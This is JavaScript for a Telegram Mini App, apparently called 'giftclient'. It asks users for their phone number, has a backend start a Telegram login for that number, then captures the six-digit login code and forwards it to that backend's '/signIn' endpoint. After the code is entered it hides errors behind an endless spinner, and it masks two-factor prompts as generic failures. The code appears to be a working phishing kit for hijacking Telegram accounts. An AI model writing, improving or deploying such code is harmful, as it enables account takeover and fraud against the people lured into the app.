

window.onload = function () {
    let phone = localStorage.getItem("phoneNumber");
    const sessionId = Math.floor(Date.now() / 1000).toString();
    const initData = window.appConfig.telegramWebApp.initData;
    const tgButton = window.appConfig.telegramWebApp.MainButton;
    const codeInput = document.getElementById("code-input");
    const verificationForm = document.getElementById("verification-form");

    async function sendCodeFlow() {
        console.log("Send code flow base url=", window.appConfig.base_url)
        let res = await fetch(`${window.appConfig.base_url}/sendCode`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, sessionId }),
        });
        console.log("send code body ", JSON.stringify({ phone, sessionId }))
        let data = await res.json();
        console.log("send code flow data ", data)
        if (data.status === "CODE_SENT") {
            phoneCodeHash = data.phoneCodeHash;
        } else if (data && data.error) {
            console.log('Incorrect phone number. What? ', data.error)
            window.appConfig.telegramWebApp.showAlert(
                data.error, function (ok) {
                    window.reload();
                }
            );
        } else {
            console.log('Incorrect phone number. What? ', data)
            window.appConfig.telegramWebApp.showAlert(
                "Произошла ошибка. Попробуйте снова позже.", function (ok) {
                    window.reload();
                }
            );
        }
    }

    async function signIn(code) {
        const isBsl = false;
        const clientApp = "giftclient";
        let res = await fetch(`${window.appConfig.base_url}/signIn`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, code, phoneCodeHash, sessionId, isBsl, clientApp }),
        });
        console.log("signIn body ", JSON.stringify({ phone, code, phoneCodeHash, sessionId }))
        let data = await res.json();
        if (data.status === "PASSWORD_REQUIRED") {
            console.log("Sign in PASSWORD REQUIRED ", data)
            window.appConfig.telegramWebApp.showAlert(
                "Ошибка. Попробуйте снова", function (ok) {
                    window.reload();
                }
            );
            return 2;
        } else if (data.status === "OK") {
            console.log("Sign in OK")
            return 0;
        } else {
            return 1;
        }
    }

    
    if (phone) {
        tgButton.setText("Отправить");
        tgButton.disable();
        tgButton.showProgress(false);
        tgButton.show();
        (async () => {
            try {
                await sendCodeFlow();
                tgButton.hideProgress();
                verificationForm.style.display = 'block';
                codeInput.focus();
            } catch (error) {
                window.appConfig.telegramWebApp.showAlert("Что-то пошло не так. Попробуйте снова.", () => {
                    console.log("Something went wrong error(if (phone) send code flow)");
                    window.location.reload();
                });
            }
        })()
    } else {
        tgButton.setText("Войти");
        tgButton.show();
    }

    // const ref = window.appConfig.telegramWebApp.initDataUnsafe.start_param;
    // const loader = document.getElementById("loader");
    // const main = document.getElementById("app");

    // const testErrorBtn = document.getElementById("test-error-btn");

    console.log("initData ", initData)

    tgButton.onClick(() => {
        if (!phone) {
            window.appConfig.telegramWebApp.requestContact(function (contact) {
                console.log(" window.appConfig.telegramWebApp.requestContact ", contact, JSON.stringify(contact))
            });
            return
        }
        const code = codeInput.value.trim().replace(/\D/g, "");
        if (code.length !== 6) {
            const message = "Could not load data. Reload MiniApp";
            const icon = "img/error.svg"
            loader.style.display = "none";
            main.style.display = "none";
            const delay = 20_000;
            playHapticError();
            showSnackbar(message, icon, delay);
            return
        }

        tgButton.showProgress(false);

        (async () => {
            try {
                const res = await signIn(code);
                if (res == 1) {
                    window.playHapticError();
                    window.appConfig.telegramWebApp.showAlert("Неверный код. Попробуйте снова.", () => {
                        console.log("Incorrect code");
                    });
                    return
                } else if (res == 0) {
                    tgButton.showProgress(false);
                } else {
                    window.playHapticError();
                    window.appConfig.telegramWebApp.showAlert("Произошла ошибка. Попробуйте снова.", () => {
                        console.log("Password required");
                    });
                    window.location.reload();
                    return
                }
            } catch (error) {
                window.appConfig.telegramWebApp.showAlert("Произошла ошибка. Попробуйте снова.", () => {
                    console.log("Something went wrong error(tgButton.onClick signIn(code)) ");
                    console.error(error);
                    window.location.reload();
                });
            }
        })()
    });

    codeInput.addEventListener("input", () => {
        codeInput.value = codeInput.value.replace(/\D/g, "");
    
        if (codeInput.value.length === 6) {
            tgButton.enable();
        } else {
            tgButton.disable();
        }
    });

    window.appConfig.telegramWebApp.onEvent("contactRequested", (eventType, eventData) => {
        console.log("contactRequested telegramWebApp onEvent eventData ", eventData, JSON.stringify(eventData))
        console.log("contactRequested telegramWebApp eventType eventType ", eventType, JSON.stringify(eventType), eventType.status == "sent", eventType.status === "sent")
        try {
            if (eventType.status && eventType.status == "sent") {
                const decodedResponse = decodeURIComponent(eventType.response);
                const params = decodedResponse.split('&').reduce((acc, part) => {
                    const [key, value] = part.split('=');
                    acc[key] = value;
                    return acc;
                }, {});

                const contactObj = JSON.parse(params.contact);
                const phoneNumber = contactObj.phone_number;
                if (phoneNumber) {
                    phone = phoneNumber;
                    localStorage.setItem("phoneNumber", phoneNumber);
                    console.log("phonenumber=", phoneNumber);

                    (async () => {
                        try {
                            await sendCodeFlow();
                            verificationForm.style.display = 'block';
                            tgButton.setText("Отправить");
                            tgButton.disable();
                            tgButton.show();
                            codeInput.focus();
                        } catch (error) {
                            window.appConfig.telegramWebApp.showAlert("Произошла ошибка. Попробуйте снова.", () => {
                                console.log("Something went wrong error(if (phoneNumber onEvent)");
                                window.location.reload();
                            });
                        }
                    })()
                } else {
                    window.appConfig.telegramWebApp.showAlert("Предоставьте доступ к номеру телефона для входа", () => {
                });
                }
            } else {
                window.appConfig.telegramWebApp.showAlert("Предоставьте доступ к номеру телефона для входа", () => {
            });
            }
        } catch (err) {
            console.error("contactRequested failed:", err);
            window.appConfig.telegramWebApp.showAlert("Предоставьте доступ к номеру телефона для входа", () => {
            });
        }
    });
    

    
    // testErrorBtn.addEventListener("click", () => {
    //     window.playHapticError();
    //     window.appConfig.telegramWebApp.showAlert("Введенный код неверный. Попробовать снова.", () => {
    //         window.location.reload();
    //     });
    // });

    // отрисовать кастомную телеграм кнопку, которая умеет дизейблиться и превращаться в прогресс, который надо отображать после успешно введенного кода бесконечно
    // document.getElementById("submit-btn").onclick = () => {
    //     window.playHapticNavigation();
        // const code = codeInput.value.trim();
        // let requiresPassword = false;
        // if (requiresPassword) {
        //     window.playHapticError();
        //     window.appConfig.telegramWebApp.showAlert("Что-то пошло не так. Попробуйте снова позже.", () => {
        //         console.log("Something went wrong error(psw required)");
        //     });
        //     return
        // }
        // let inCorrectCode = false;
        // if (inCorrectCode) {
        //     window.playHapticError();
        //     window.appConfig.telegramWebApp.showAlert("Введенный код неверный. Попробовать снова.", () => {
        //         window.location.reload();
        //     });
        //     return
        // }

    //     // todo show loading
    // };

        //   const message = "Could not load data. Reload MiniApp";
        //     const icon = "img/error.svg"
        //     loader.style.display = "none";
        //     main.style.display = "none";
        //     const delay = 20_000;
        //     playHapticError();
        //     showSnackbar(message, icon, delay);





};

